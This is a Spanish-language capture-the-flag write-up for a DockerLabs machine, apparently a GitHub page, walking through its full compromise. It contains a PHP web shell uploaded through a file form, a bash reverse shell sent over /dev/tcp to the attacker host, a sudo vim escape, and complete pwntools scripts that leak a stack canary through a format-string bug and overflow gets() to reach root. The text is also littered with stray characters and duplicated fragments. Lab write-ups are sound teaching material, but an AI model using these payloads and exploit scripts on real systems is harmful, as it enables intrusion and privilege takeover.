<img width="891" height="453" alt="image" src="https://github.com/user-attachments/assets/15623985-c6a6-4478-834a-edff585489bd" />

# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: hard](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)

#  Escaneo de  servicios  y puertos y serviicios 

```ruby
nmap -p- --open -sS --min-rate 5000 -n -v -Pn -sCV -oN targeted.txt 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:43 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 8080/tcp on 172.17.0.2
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.11.2)
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

     (-p-): todo el rango de puertos

    (--open): solo reportar los puertos abiertos

    (-sS): usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

    (--min-rate:)5000 enviar como mínimo 5000 paquetes por segundo

    -vvv: triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

    (-n) : no hacer resolución DNS

    (-Pn) no hacer host discovery

    (-oG) tcp_ports exportar el output en formato grepeable al archivo tcp_ports
```
# puertos abiertos 

Hacemos un escaneo de servicios y versiones sobre el puerto 80:
```ruby
nmap -p80 -sCV 172.17.0.2 -oN targeted
tarting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:48 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    ApSache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds

    -p22,80 hacer el escaneo solo sobre los puertos 22 y 80

    -sCV lanzar escaneo de versiones y scripts estándar de reconocimiento

    -oN targeted exportar el output al archivo targeted, en formato nmapSSSubir archivo` nos lleva a un panel de subida de archivos:
```

Vemos esta web bastante simple. Pone "Sube tu archivo", y arriva tenemos una barra de navegación. SI clicamos en Inicio nos lleva al `index.html`, y si clicamos en `Subir archivo` nos lleva a un panel de subida de archivos:
<img width="679" height="193" alt="image" src="https://github.com/user-attachments/assets/102a0d2f-4105-47f5-9569-58fcb1254f84" />

Probamos a subir directamente un archivo `.phtml` este contenido:
```ruby
<?php
    system($_GET['cmd']);S
```
si lo hacen con la extencion php normal no los va dejar pueden ir probando otras extensiones PHP, mirando en `HackTricks`.


# INTRUSIÓN

Nos ponemos en escucha:
```ruby
nc -nlvp 443
```
Y ejecutamos la reverse shell:S
```rubySS
http://172.17.0.2/uploads/rce.phtml?cmd=/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```
S
# TRATAMIENTO TTY
```ruby
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fgS
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```
Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

# ESCALADA DE PRIVILEGIOS
# Jerry
Somos www-data. Ejecutamos sudo -lpara ver si tenemos privilegios de sudo:SSS
<img width="544" height="130" alt="image" src="https://github.com/user-attachments/assets/669170af-09a6-4974-982a-3c16156cda07" />

Podemos ejecutar como el usuario jerry, sin poner contraseña, el binario vim.  Gracias a `gtfobins`

sabemos que podemos ejecutar comandos usando ese binario de esta forma:
```ruby
sudo -u jerry vim
```
Y dentro del editor de VIM ejecutamos:
```ruby
:!bash
```
<img width="547" height="89" alt="image" src="https://github.com/user-attachments/assets/5799f754-68bc-4084-ba78-40a0ddddba62" />

# ROOT
Siendo ya el usuario jerry, ejecutamos otra vez `sudo -l`:

Tenemos varios privilegios. El que más llama la atención es un script de python3 llamado command_exec.py, así que probamos a ejecutarlo:
S
```ruby
sudo /usr/bin/python3 /opt/command_exec/command_exec.py
```
<img width="833" height="59" alt="image" src="https://github.com/user-attachments/assets/fae59ed4-b83f-49e3-aad1-f860d3ff6268" />

Nos dice "Denegado". Para saber la razón, inspeccionamos el código del script:
```python
#!/usr/bin/python3

import os, sys

def main():

    with open("/opt/command_exec/flag.txt", "r") as flag_file:

        content = flag_file.readlines()[0]

        if content == "ACTIVE":

            print("Autorizado\n")

            cmd = input("Escribe un comando: ")

            os.system(cmd)

        else:

            print("Denegado")
            sys.exit(1)


if __name__ == '__main__':

    main()
```
El script abre el archivo `/opt/command_exec/flag.txt`, y si su contenido es "ACTIVE", nos deja ejecutar un comando. El archivo flag.txt vale "INACTIVE", por lo que no nos deja ejecutar comandos. No tenemos permisos de escritura en el archivo `flag.txt`, ni en `/opt`, por lo que en esta parte no podemos hacer nada por ahora.

# Buffer OVERFLOW

# NOTA
 ANTES DE HACER EL Buffer Overflow  les recomiendo que entiendal el por que de  las cosas, para esto les dejare un video de pinguino de mario [Aprende a Explotar un BUFFER OVERFLOW Paso a Paso](https://www.youtube.com/watch?v=C06r6DfCxpA&t=905s)
S
S
Pasamos a ver el otro privilegio: /opt/suma. Si ejecutamos file /opt/suma, veremos que es un binario ejecutable de 64 bits. 

Como esta parte de la escalada va seguramente a estar relacionada con la explotación de este binario, para trabajar más cómodamente, transfiero el archivo a mi máquina `(python3 -m http.server 9090 y wget http://172.17.0.2:9090/suma)`.

Ejecutamos checksec `./suma`:



Tiene los canarios del stack activados y tiene NX, por lo que no se puede ejecutar shellcode en el stack. No tiene PIE, por lo que las direcciones del código van a ser siempre las mismas.

Probamos a ejecutarlo:
```ruby
checksec suma

Resultado: [*] '/root/kali/Downloads/suma'

Arch: amd64-64-little

RELRO: Partial RELRO
SS
Stack: Canary found

NX: NX enabled
PIE: No PIE (0x400000)
```
Tenemos 2 inputs. El primero de primeras parece irrelevante, y el segundo parece ser comprobado con otro valor que desconocemos. Podemos hacer `ltrace . /suma`, para ver las llamadas a funciones en tiempo de ejcución, y así poder ver con que se compara nuestro input:

<img width="422" height="118" alt="image" src="https://github.com/user-attachments/assets/377f8239-e497-417f-9f0f-331e755392b7" />

Vemos la clave en texto claro. Ahora lo ejecutamos y ponemos la clave:
<img width="559" height="247" alt="image" src="https://github.com/user-attachments/assets/bcc57398-f4d0-4d37-a1c7-25ebb288940c" />

Al proprocionar la clave, simplemente se nos piden 2 números y nos dice la suma de estos. Como esto no es nada interesante, buscamos otras vias de explotación. Probamos a ver las funciones del binario desde GDB (`gdb ./suma info functions`):Al proprocionar la clave, simplemente se nos piden 2 números y nos dice la suma de estos. Como esto no es nada interesante, buscamos otras vias de explotación. Probamos a ver las funciones del binario desde GDB (`gdb ./suma info functions):

<img width="289" height="83" alt="image" src="https://github.com/user-attachments/assets/6bec25cd-a721-4446-a7c1-9bef7c068639" />

Hay una muy interesante llamada `set_flag`. Podemos aplicar ingeniería inversa con Ghidra para ver que hace esta función:

<img width="406" height="230" alt="image" src="https://github.com/user-attachments/assets/1a907884-66f1-4a23-ab39-a2e9049a77d9" />


La función abre el archivo `/opt/command_exec/flag.txt`, y escribe "ACTIVE". Si conseguimso llamar a esta función y que se escriba el archivo, podremos ejecutar el script de python3 y ejecutar comandos como root.

Para conseguir llamar a esta función, tenemos que explotar de alguna manera el binario, ya que en la función `main()`, nunca se llama a `set_flag()`, por lo que tendríamos que usar un buffer overflow u otro tipo de vulnerabilidad.
S
Para identificar las vulnerabilidades del binario, usamos ltrace:
<img width="522" height="376" alt="image" src="https://github.com/user-attachments/assets/b90d3365-0f79-403a-a7b1-c9116a981598" />


El primer input se almacena mediante `fgets()`, por lo que ahí no hay buffer overflow. El segundo input se almacena mediante `gets()`, por lo que ahí sí hay buffer overflow.

El problema es que el binario tiene canarios, por lo que si explotamos el buffer overflow de forma convencional, se va a llamar a una función especial que va a terminar rápidamente la ejecución del programa. Esto ocurre porque en el stack se almacena un canario, al inicio de main(), y se le da un valor aleatorio. Al final de `main()`, se comprueba si el canario sigue valiendo el mismo valor, y si ha cambiado, se llama a la función especial, ya que significa que ha ocurrido un buffer overflow y se han sobrescrito los datos del stack.

Pero se puede bypassear, si de alguna manera conseguimos leer datos del stack antes de que se llame a `gets()`. El primer input se almacena de forma segura, pero luego se llama a `printf(input)` , y se le pasa como primer argumento el input. Esto origina una Format String Vulnerability, ya que printf() toma el input como formato. Entonces podemos incluir especificadores de formato, como `%s, %p...` Si probamos a enviar `%p`, pasa esto:

<img width="184" height="72" alt="image" src="https://github.com/user-attachments/assets/e3897d46-8db3-419f-ad08-d57c178738f7" />


Se llama a `printf("%p")`, por lo que se espera un segundo parámetro que sea un puntero, pero como no hay, ese valor se saca del stack. De esta manera podemos ir leyendo uno a uno los datos del stack: `%1$p`  para leer el primer valor, `%2$p para leer el segundo...

Sabiendo esto, podemos crearnos un script en python3 que haga fuzzing y lea X valores del stack. De esta forma, podemos buscar luego sobre los resultados cual podría ser el canario, y entonces quedarnos con la posición de este, y así en el buffer overflow poder sobrescribir el canario del stack con su valor inicial:

```python 
#!/usr/bin/python3

from pwn import *

def fuzz(num):

    filename = "./suma"

    context.binary = ELF(filename, checksec=False)
    context.log_level = "error"

    for n in range(num):

        try:

            p = process(filename)

            p.sendlineafter(b':', '%{}$p'.format(n).encode())

            p.recvuntil(b'Hola, ')
            result = p.recvline()

            print("{}: {}".format(n, result))

            p.close()

        except:SSS

            pass


if __name__ == '__main__':

    fuzz(100)
```
Con este script, leemos 100 valores del stack:

<img width="290" height="267" alt="image" src="https://github.com/user-attachments/assets/e83fb60b-e87d-4af8-9d3a-60befec7d789" />


Ahora dentro de todos estos valores tenemos que buscar el canario. Para hacer esto, tenemos que tener en cuenta dos factores:

    Los canarios acaban en 00

    Los canarios son números aleatorios, a diferencia de las direcciones de libc que suelen ser 0x7ff

Sabiendo esto, podemos hacer la búsqueda del canario a ojo, o con grep:
```python
python3 fuzzer.py | grep -oE ".*?[0-9a-f]{14}00"
```
Le decimos a grep que queremos buscar los resultados que contengan cualquier cosa, seguido de 14 dígitos que vayan del 0 al 9 o de la a a la f (hexadecimal), y terminado en 00:
<img width="446" height="57" alt="image" src="https://github.com/user-attachments/assets/cfaac0ac-c7c9-4772-a06f-457a5ea46f9d" />


Vemos dos resultados. Podemos elegir cualquiera de los dos aunque tengan valores distintos, ya que en tiempo de ejecución acaban valiendo lo mismo.

Ya tenemos la forma de leer el canario. Cuando creemos el payload para el buffer overflow, tenemos que saber el offset para sobrescribir el canario y el offset para sobrescribir la dirección de retorno. Para saber estos datos podemos usar Ghidra:

<img width="511" height="579" alt="image" src="https://github.com/user-attachments/assets/da983770-dd32-49f5-9edf-7d3707b8647e" />


Vemos que el buffer vulnerable a buffer overflow es de 264 bytes, y es local_118. En la primera imagen vemos que este buffer esta en el offset -0x118, que son 280 bytes. Podemos ver que justo encima del buffer esta `local_10`, que es el canario. Sabemos que es el canario porque en el código vemos que a esta variable se le da un valor al principio, y se comprueba su valor al final y si no es igual al inicial se llama a `__stack_chk_fail()`. Entonces como el canario está encima del buffer, si escribimos 264 bytes, los siguientes 8 bytes sobrescriben el canario (el canario vale 8 bytes porque el binario es de 64 bits, si fuese de 32 bits el canario valdría 4 bytes). 280 - 264 - 8 = 8, es decir, que nos quedan otros 8 bytes para llegar a la dirección de retorno. Después de hacer todo esto, sabemos que el offset para sobrescribir el canario es 264, y el de sobrescribir el RIP es 8.

Ya tenemos todo lo necesario para crear el exploit final que haga el buffer overflow:
```ruby
#!/usr/bin/python3

from pwn import *

def main():

    def start():

        if args.GDB:
            return gdb.debug(filename, gdbscript=gdbscript)
        elif args.REMOTE:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process(filename)

    filename = "./suma"

    elf = context.binary = ELF(filename, checksec=False)
    context.log_level = "error"

    gdbscript = """
    """


    canary_offset = 264
    rip_offset = 8


    p = start()

    p.sendlineafter(b':', b'%69$p')

    p.recvuntil(b'Hola, ')
    canary = int(p.recvline().strip(), 16)


    payload = flat(

            b'A'*canary_offset,
            canary,
            b'A'*rip_offset,
            elf.functions.set_flag
    )


    p.sendlineafter(b':', payload)

    print(p.recvall())

    p.close()


if __name__ == '__main__':

    main()
```
Lo ejecutamos:
<img width="298" height="40" alt="image" src="https://github.com/user-attachments/assets/36759477-cd11-4402-90a4-4a94a10baa13" />

Y conseguimos activar la flag. Aunque estamos en nuestra máquina, no hemos hecho nada en realidad. Ahora hay que pasarlo a la máquina víctima, pero antes hay que cambiar en el exploit dos cosas:

```ruby
return process(["sudo", filename])
```
S
Ya que en la máquina víctima tenemos que ejecutar `suma` con privilegios de sudo.S

```ruby
filename = "/opt/suma"
```
Ya que es donde está el binario en la máquina víctima.

Ahora sí, lo transferimos `(python3 -m http.server 9090 wget http://172.17.0.1:9090/exploit.py)`.

Como tenemos que usar pwntools, ejecutamos:S


```ruby
pip3 install pwntools --break-system-packages
```
Aunque si no estuviese `pip3` en la máquina se puede usar `subprocess` en la explotación, que es un módulo nativo de python.

Una vez instalado, ejecutamos el exploit:
<img width="356" height="56" alt="image" src="https://github.com/user-attachments/assets/797787cd-266c-48ad-815c-22054ad07877" />

Y ahora podemos ejecutar comandos con:

<img width="639" height="143" alt="image" src="https://github.com/user-attachments/assets/ee59e6ce-d59e-493f-a40d-18b6d0b62b3d" />
